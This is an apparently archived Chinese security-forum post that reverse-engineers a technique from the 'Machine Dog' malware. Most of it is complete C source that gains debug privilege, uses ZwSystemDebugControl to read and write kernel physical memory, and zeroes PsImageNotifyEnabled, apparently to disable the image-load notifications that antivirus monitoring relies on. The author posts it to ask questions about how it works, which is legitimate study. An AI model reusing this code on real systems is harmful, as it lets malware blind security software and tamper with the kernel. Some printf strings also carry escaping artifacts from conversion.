@@ -1,0 +1,545 @@
+
+# R3 下设 `PsSetLoadImageNotifyRoutine` 的 `ImageNotifyEnable`
+
+> 原文：[`www.pediy.com/kssd/pediy10/67873.html`](https://www.pediy.com/kssd/pediy10/67873.html)
+
+近几天在看机器狗时看到机器狗使用的这个技术。
+
+逆向了一下那功能，但有几个问题不太清楚的，烦请大大们指教下。
+
+留个 blog 地址，做下广告：`http://blog.163.com/takile`
+
+以下为代码（代码写得不好，有兴趣的看看吧.）：
+
+```c
+#include <stdio.h>
+
+#include <windows.h>
+
+typedef long NTSTATUS;
+
+#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
+
+#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
+
+#define NT_SUCCESS(status) ((NTSTATUS)(status) >= 0)
+
+typedef struct _SYSTEM_MODULE_INFORMATION
+{
+  ULONG Reserved[2];
+  PVOID Base;
+  ULONG Size;
+  ULONG Flags;
+  USHORT Index;
+  USHORT Unknown;
+  USHORT LoadCount;
+  USHORT ModuleNameOffset;
+  CHAR ImageName[256];
+}SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
+
+typedef struct _MemoryChunk
+{
+  PVOID pPhysicalAddress;
+  PVOID pUnknown;
+  PVOID pBuffer;
+  DWORD dwBufferSize;
+}MemoryChunk;
+
+typedef enum _SYSTEM_INFORMATION_CLASS
+{
+    SystemBasicInformation,
+    SystemProcessorInformation,
+    SystemPerformanceInformation,
+    SystemTimeOfDayInformation,
+    SystemNotImplemented1,
+    SystemProcessesAndThreadsInformation,
+    SystemCallCounts,
+    SystemConfigurationInformation,
+    SystemProcessorTimes,
+    SystemGlobalFlag,
+    SystemNotImplemented2,
+    SystemModuleInformation,
+    SystemLockInformation,
+    SystemNotImplemented3,
+    SystemNotImplemented4,
+    SystemNotImplemented5,
+    SystemHandleInformation,
+    SystemObjectInformation,
+    SystemPagefileInformation,
+    SystemInstructionEmulationCounts,
+    SystemInvalidInfoClass1,
+    SystemCacheInformation,
+    SystemPoolTagInformation,
+    SystemProcessorStatistics,
+    SystemDpcInformation,
+    SystemNotImplemented6,
+    SystemLoadImage,
+    SystemUnloadImage,
+    SystemTimeAdjustment,
+    SystemNotImplemented7,
+    SystemNotImplemented8,
+    SystemNotImplemented9,
+    SystemCrashDumpInformation,
+    SystemExceptionInformation,
+    SystemCrashDumpStateInformation,
+    SystemKernelDebuggerInformation,
+    SystemContextSwitchInformation,
+    SystemRegistryQuotaInformation,
+    SystemLoadAndCallImage,
+    SystemPrioritySeparation,
+    SystemNotImplemented10,
+    SystemNotImplemented11,
+    SystemInvalidInfoClass2,
+    SystemInvalidInfoClass3,
+    SystemTimeZoneInformation,
+    SystemLookasideInformation,
+    SystemSetTimeSlipEvent,
+    SystemCreateSession,
+    SystemDeleteSession,
+    SystemInvalidInfoClass4,
+    SystemRangeStartInformation,
+    SystemVerifierInformation,
+    SystemAddVerifier,
+    SystemSessionProcessesInformation
+} SYSTEM_INFORMATION_CLASS;
+
+typedef enum _DEBUG_CONTROL_CODE{
+  DebugGetTraceInformation = 1,
+  DebugSetInternalBreakpoint = 2,
+  DebugSetSpeicalCall = 3,
+  DebugClearSpeicalCalls = 4,
+  DebugQuerySpecialCalls = 5,
+  DebugDbgBreakPoint = 6,
+  //获取 KdVersionBlock
+  DebugSysGetVersion = 7,
+  /*
+    从内核空间拷贝到用户空间,或者从用户空间拷贝到用户空间
+    但不能从用户空间拷贝到内核空间
+  */
+  DebugCopyMemoryChunks_0 = 8,
+  /*
+    从用户空间拷贝到内核空间,或者从用户空间拷贝到用户空间
+    但不能从内核空间拷贝到用户空间
+  */
+  DebugCopyMemoryChunks_1 = 9,
+  /*
+    从物理地址拷贝到用户空间,不能写至内核空间
+  */
+  DebugCopyPhyMemory_0 = 10,
+  /*
+    从用户空间拷贝到物理地址,不能读取内核空间
+  */
+  DebugCopyPhyMemory_1 = 11,
+  //读写处理器相关控制块
+  DebugSysReadControlSpace = 12,
+  DebugSysWriteControlSpace = 13,
+  //读写端口
+  DebugSysReadIoSpace = 14,
+  DebugSysWriteIoSpace = 15,
+  //分别调用 RDMSD@4 和 WRMSR@12
+  DebugSysReadMsr = 16,
+  DebugSysWriteMsr = 17,
+  //读写总线数据
+  DebugSysReadBusData = 18,
+  DebugSysWriteBusData = 19,
+  DebugSysCheckLowMemory = 20,
+  //分别调用 _KdEnableDebugger@0 和 _KdDisableDebugger@0
+    DebugSysEnableDebugger = 21,
+    DebugSysDisableDebugger = 22,
+    //获取和设置一些调试相关的变量
+    DebugSysGetAutoEnableOnEvent = 23,
+    DebugSysSetAutoEnableOnEvent = 24,
+    DebugSysGetPitchDebugger = 25,
+    DebugSysSetDbgPrintBufferSize = 26,
+    DebugSysGetIgnoreUmExceptions = 27,
+    DebugSysSetIgnoreUmExceptions = 28
+}DEBUG_CONTROL_CODE;
+
+NTSTATUS WINAPI ZwQuerySystemInformation(
+                     ULONG SystemInformationClass,
+                     PVOID SystemInformation,
+                     ULONG SystemInformationLength,
+                     PULONG ReturnLength
+                     );
+
+NTSTATUS NTAPI ZwSystemDebugControl(
+                    IN DEBUG_CONTROL_CODE ControlCode,
+                    IN PVOID InputBuffer,
+                    IN ULONG InputBufferLength,
+                    OUT PVOID OutputBuffer,
+                    IN ULONG OutputBufferLength,
+                    OUT PULONG ReturnLength
+                    );
+
+typedef NTSTATUS (__stdcall *ZWQUERYSYSTEMINFORMATION)(
+                             ULONG SystemInformationClass,
+                             PVOID SystemInformation,
+                             ULONG SystemInformationLength,
+                             PULONG ReturnLength
+                             );
+
+typedef NTSTATUS (__stdcall *ZWSYSTEMDEBUGCONTROL)(
+                           IN DEBUG_CONTROL_CODE ControlCode,
+                           IN PVOID InputBuffer,
+                           IN ULONG InputBufferLength,
+                           OUT PVOID OutputBuffer,
+                           IN ULONG OutputBufferLength,
+                          OUT PULONG ReturnLength
+                           );
+
+NTSTATUS
+PsSetLoadImageNotifyRoutine(
+               IN PVOID  NotifyRoutine
+               );
+
+void CurrentProcess_AdjustTokenPrivileges()
+{
+  BOOL bRet = FALSE;
+  HANDLE hTokenHandle = NULL;
+  TOKEN_PRIVILEGES tp;
+  LUID luid;
+  bRet = ::OpenProcessToken((HANDLE)::GetCurrentProcess(), 0xF01FF, &hTokenHandle);
+  if ( FALSE == bRet )
+  {
+    printf("OpenProcessToken error: %u\n", ::GetLastError());
+    goto FunReturn;
+  }
+  if ( 0 == ::LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid) )
+  {
+    printf("LookupPrivilegeValue error: %u\n", ::GetLastError());
+    goto FunReturn;
+  }
+  tp.PrivilegeCount = 1;
+  tp.Privileges[0].Luid = luid;
+  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+  if ( 0 == ::AdjustTokenPrivileges(hTokenHandle, 0, &tp, sizeof(TOKEN_PRIVILEGES), 0, 0) )
+  {
+    printf("AdjustTokenPrivileges error: %u\n", ::GetLastError());
+    goto FunReturn;
+  }
+
+FunReturn:
+  if ( NULL != hTokenHandle )
+  {
+    CloseHandle(hTokenHandle);
+    hTokenHandle = NULL;
+  }
+}
+
+ZWQUERYSYSTEMINFORMATION pZwQuerySystemInformation = NULL;
+ZWSYSTEMDEBUGCONTROL pZwSystemDebugControl = NULL;
+
+int main(int argc, char * argv[])
+{
+  DWORD dwRet = 0;
+  HMODULE hNtDll_Module = NULL, hNtOs_Module = NULL;
+  BYTE *pBuf = NULL, *pImageName = NULL, *pImageNameOffset = NULL;
+  DWORD dwReturnLength = 0, dwIndex = 0, dwToRead = 0;
+  PSYSTEM_MODULE_INFORMATION pSysModuleInfo = NULL;
+  ULONG uModuleCount = 0;
+  USHORT uModuleNameOffset = 0;
+  PVOID pPsSetLoadImageNotifyRoutine = NULL;
+  PVOID pRealPsSetLoadImageNotifyRoutine = NULL;
+  PVOID pPsImageNotifyEnabled = 0;
+  char szImageName[MAX_PATH] = {0};
+  MemoryChunk structMemory;
+  BYTE *pInstruction = NULL, *pOriInstruction = NULL;
+  CurrentProcess_AdjustTokenPrivileges();
+  hNtDll_Module = ::GetModuleHandle("ntdll.dll");
+  if ( NULL == hNtDll_Module )
+  {
+    printf("GetmoduleHandle Error = %u\n", ::GetLastError());
+    goto FunReturn;
+  }
+  pZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)::GetProcAddress(hNtDll_Module, "ZwQuerySystemInformation");
+```
+
+
+
+```c
+  pZwSystemDebugControl = (ZWSYSTEMDEBUGCONTROL)::GetProcAddress(hNtDll_Module, "ZwSystemDebugControl");  
+
+  if ( NULL == pZwSystemDebugControl || NULL == pZwQuerySystemInformation )  
+
+  {  
+
+    printf("pZwSystemDebugControl or pZwQuerySystemInformation is NULL.\\n");  
+
+    goto FunReturn;  
+
+  }  
+
+  dwRet = pZwQuerySystemInformation(SystemModuleInformation, pBuf, 0, &dwReturnLength);  
+
+  if ( STATUS_SUCCESS != dwRet )  
+
+  {  
+
+    if ( STATUS_INFO_LENGTH_MISMATCH != dwRet )  
+
+    {  
+
+      printf("ZwQuerySystemInformation Error = %u\\n", ::GetLastError());  
+
+      goto FunReturn;  
+
+    }  
+
+    else  
+      pBuf = new BYTE[dwReturnLength];  
+
+  }  
+
+  if ( NULL == pBuf )  
+
+  {  
+
+    printf("pBuf == NULL.\\n");  
+
+    goto FunReturn;  
+
+  }  
+
+  dwRet = pZwQuerySystemInformation(SystemModuleInformation, pBuf, dwReturnLength, 0);  
+
+  if ( STATUS_SUCCESS != dwRet )  
+
+  {  
+
+    printf("ZwQuerySystemInformation Error = %u\\n", ::GetLastError());  
+
+    goto FunReturn;  
+
+  }  
+
+  uModuleCount = *((PULONG)pBuf);  
+
+  pSysModuleInfo = (PSYSTEM_MODULE_INFORMATION)(PUCHAR)((PUCHAR)pBuf + sizeof(ULONG));  
+
+  uModuleNameOffset =  (USHORT)(PSYSTEM_MODULE_INFORMATION)pSysModuleInfo->ModuleNameOffset;  
+
+  pImageName = (BYTE *)(PSYSTEM_MODULE_INFORMATION)pSysModuleInfo->ImageName;  
+
+  pImageNameOffset = pImageName + uModuleNameOffset;  
+
+  hNtOs_Module = ::LoadLibraryEx((char *)pImageNameOffset, 0, DONT_RESOLVE_DLL_REFERENCES);  
+
+  if ( NULL == hNtOs_Module )  
+
+  {  
+
+    printf("LoadLibraryEx Error = %u\\n", ::GetLastError());  
+
+    goto FunReturn;  
+
+  }  
+
+  pPsSetLoadImageNotifyRoutine = ::GetProcAddress(hNtOs_Module, "PsSetLoadImageNotifyRoutine");  
+
+  if ( NULL == pPsSetLoadImageNotifyRoutine )  
+
+  {  
+
+    printf("GetProcAddress(PsSetLoadImageNotifyRoutine) Error = %u\\n", ::GetLastError());  
+
+    goto FunReturn;  
+
+  }  
+
+  pRealPsSetLoadImageNotifyRoutine = (BYTE *)((BYTE *)pPsSetLoadImageNotifyRoutine - (BYTE *)hNtOs_Module);  
+
+  pRealPsSetLoadImageNotifyRoutine = (BYTE *)((BYTE *)(PSYSTEM_MODULE_INFORMATION)pSysModuleInfo->Base + (DWORD)pRealPsSetLoadImageNotifyRoutine);  
+
+  dwReturnLength = 0;  
+
+  pOriInstruction = new BYTE[128];  
+
+  if ( NULL == pOriInstruction )  
+
+  {  
+
+    printf("pInstruction == NULL.\\n");  
+
+    goto FunReturn;  
+
+  }  
+
+  __asm  
+
+  {  
+
+    and pRealPsSetLoadImageNotifyRoutine, 7FFFFFFFh  
+
+  }  
+
+  structMemory.pPhysicalAddress = pRealPsSetLoadImageNotifyRoutine;  
+
+  structMemory.pUnknown = NULL;  
+
+  structMemory.pBuffer = pOriInstruction;  
+
+  structMemory.dwBufferSize = 128;  
+
+  dwRet = pZwSystemDebugControl(DebugCopyPhyMemory_0, &structMemory, sizeof(MemoryChunk), 0, 0, &dwReturnLength);  
+
+  if ( STATUS_SUCCESS != dwRet )  
+
+  {  
+
+    printf("ZwSystemDebugControl Error = %u\\n", ::GetLastError());  
+
+    goto FunReturn;   
+
+  }  
+
+  pInstruction = pOriInstruction;  
+
+  for ( dwIndex = 0; dwIndex < 128; dwIndex++ )  
+
+  {  
+
+    if ( *pInstruction == 0xC6 && *(pInstruction + 1) == 0x05 )  
+
+    {  
+
+      pPsImageNotifyEnabled = 0;  
+
+      pInstruction += 2;  
+
+      pPsImageNotifyEnabled = (PVOID)*(PDWORD)pInstruction;  
+
+      break;  
+
+    }  
+
+    pInstruction++;  
+
+  }  
+
+  if ( (DWORD)pPsImageNotifyEnabled < 0x80000000 )  
+
+  {  
+
+    printf("pPsImageNotifyEnabled < 0x80000000.\\n");  
+
+    goto FunReturn;  
+
+  }  
+
+  __asm  
+
+  {  
+
+    and pPsImageNotifyEnabled, 7FFFFFFFh  
+
+  }  
+
+  structMemory.pPhysicalAddress = pPsImageNotifyEnabled;  
+
+  structMemory.pUnknown = NULL;  
+
+  structMemory.pBuffer = &dwToRead;  
+
+  structMemory.dwBufferSize = 4;  
+
+  dwReturnLength = 0;  
+
+  dwRet = pZwSystemDebugControl(DebugCopyPhyMemory_0, &structMemory, sizeof(MemoryChunk), 0, 0, &dwReturnLength);  
+
+  if ( STATUS_SUCCESS != dwRet )  
+
+  {  
+
+    printf("ZwSystemDebugControl Error = %u\\n", ::GetLastError());  
+
+    goto FunReturn;   
+
+  }  
+
+  printf("---.\\n");  
+
+  if ( dwToRead == 1 )  
+
+  {  
+
+    dwToRead = 0;  
+
+    structMemory.pPhysicalAddress = pPsImageNotifyEnabled;  
+
+    structMemory.pUnknown = NULL;  
+
+    structMemory.pBuffer = &dwToRead;  
+
+    structMemory.dwBufferSize = 4;  
+
+    dwReturnLength = 0;  
+
+    dwRet = pZwSystemDebugControl(DebugCopyPhyMemory_1, &structMemory, sizeof(MemoryChunk), 0, 0, &dwReturnLength);  
+
+    if ( STATUS_SUCCESS == dwRet )  
+      printf("Ok.\\n");  
+
+  }  
+
+FunReturn:  
+
+  if ( NULL != hNtDll_Module )  
+
+  {  
+
+    FreeLibrary(hNtDll_Module);  
+
+    hNtDll_Module = NULL;  
+
+  }  
+
+  if ( NULL != hNtOs_Module )  
+
+  {  
+
+    FreeLibrary(hNtOs_Module);  
+
+    hNtOs_Module = NULL;  
+
+  }  
+
+  if ( NULL != pBuf )  
+
+  {  
+
+    delete[] pBuf;  
+
+    pBuf = NULL;  
+
+  }  
+
+  if ( NULL != pOriInstruction )  
+
+  {  
+
+    delete[] pOriInstruction;  
+
+    pOriInstruction = NULL;  
+
+    pInstruction = NULL;  
+
+  }  
+
+  pImageNameOffset = NULL;  
+
+  pImageName = NULL;  
+
+  system("pause");  
+
+  return 0;  
+
+}
+```
+
+### 问题一
+
+把 `PsSetLoadImageNotifyRoutine` 的内核地址高位置 0 是什么意思阿?有什么详细的文档解释一下吗?
+
+### 问题二
+
+通过搜索指令找到 `PsImageNotifyEnabled` 并把其设 0,具体有什么作用阿?把杀软的实时监控功能废掉吗?
